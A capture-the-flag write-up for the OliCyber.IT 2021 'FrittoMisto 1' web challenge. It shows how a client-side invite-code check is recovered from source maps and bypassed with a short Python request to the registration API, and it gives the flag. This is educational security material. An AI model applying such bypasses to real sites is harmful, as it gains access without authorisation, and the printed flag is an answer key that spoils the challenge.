# OliCyber.IT 2021 – National Competition

## FrittoMisto 1 - Writeup

## Challenge description
```
Il Gabibbo ha contattato diversi sviluppatori per sistemare il design del suo sito, tuttavia sembra si sia dimenticato di invitarci, riesci a farci qualcosa?

Sito: http://frittomisto.challs.olicyber.it/
```

The challenge presents a web application under construction, with the ability to register and access a private area.
However, in order to register, an **invite code** is required.

---

## Solution

When attempting to register, the error message *"Codice di invito invalido!"* (*Invalid invite code!*) appears **before** any request is sent to the API.
This indicates that the validation happens **client-side**.

While there may also be server-side validation, this client-side check can be reversed to discover the correct invite code.

The site is built using [React](https://reactjs.org/). Since the code is bundled with [Webpack](https://webpack.js.org/), the exported JavaScript is obfuscated. Fortunately, **source maps** are enabled, meaning the original `.js` files can be inspected through the browser DevTools.

Inside the code, we find the invite validation logic:

```js
if (inviteCode.length !== 10) {
  console.log("Codice di invito invalido!");
  props.setError("Codice di invito invalido!");
  return;
}
for (let idx = 0; idx < 10; idx++) {
  if (inviteCode.charCodeAt(idx) != idx) {
    console.log("Codice di invito invalido!");
    props.setError("Codice di invito invalido!");
    return;
  }
}
```

From this snippet we learn:

* The invite code must be exactly **10 characters long**.
* Each character must match the ASCII values `0x00, 0x01, ..., 0x09`.

Thus, the correct invite string is:

```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09
```

---

## Exploit

The simplest way to register is by making a direct API request with Python:

```python
import requests
import random
import string
import re

url = 'http://frittomisto.challs.olicyber.it/api/register'

username, password = ["".join(random.choices(string.ascii_uppercase + string.digits, k=10)) for _ in range(2)]

r=requests.post(url, json={
    "username": f"{username}",
    "password": f"{password}",
    "invite": "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09"
})

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])
```
---
## Solution

By running the exploit we can retrieve the flag.
```
flag{b3nv3nut0_n3l_m10_f4nt4st1c0_s1t0_bu0n_l4v0r0}
```

---
## Key Takeaway

This challenge demonstrates the danger of relying on **client-side validation**. Even if server-side checks exist, leaving validation logic exposed in the frontend allows attackers to reverse-engineer it and recover the correct values.
